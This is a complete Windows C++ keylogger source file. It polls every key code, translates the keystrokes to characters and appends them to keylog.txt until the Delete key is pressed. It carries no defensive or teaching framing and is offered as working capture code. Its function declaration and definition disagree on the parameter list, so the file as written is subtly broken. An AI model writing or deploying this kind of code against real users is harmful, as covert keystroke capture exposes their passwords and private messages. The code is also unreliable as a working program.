#include <iostream>
#include <windows.h>
#include <fstream>
#pragma comment(lib, "user32.lib")

void sniff_keys(std::ofstream& logfile);

int main()
{
    // Open the file to log keys
    std::ofstream logfile;
    logfile.open("keylog.txt", std::ios::app);

    // Check if file opened successfully
    if (!logfile.is_open())
    {
        MessageBox(NULL, "Unable to open log file!", "Error", MB_ICONERROR);
        return 1;
    }
    sniff_keys(logfile);
    logfile.close();

    return 0;
}

void sniff_keys(std::ofstream& logfile, int stopKey)
{
    bool isSniffing = true;
    while(isSniffing) 
    {
        
        // Loop through all possible key codes (0x08 to 0xFF)
        for (int key = 0x08; key <= 0xFF; key++)
        {
            // Check if the key is pressed
            if (GetAsyncKeyState(key) & 0x8000)
            {

                if (key == 	0x2E){
                    isSniffing = false;
                }

                BYTE keyboardState[256];
                GetKeyboardState(keyboardState); // Get the state of all keys

                // Translate virtual key to ASCII
                char buffer[2] = { 0 }; // To hold the translated character
                bool isSucceeded = ToAscii(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, (LPWORD)buffer, 0) == 1;
                if (isSucceeded)
                {
                    
                    // Log the character to the file
                    logfile << buffer[0];
                    std::cout << buffer << std::endl;
                    logfile.flush(); // Flush after every key press
                }
            }
        }

        // Add a small delay to reduce CPU usage
        Sleep(50);
    }
    std::cout << "\n";
    std::cout << "Stopped sniffing!";
};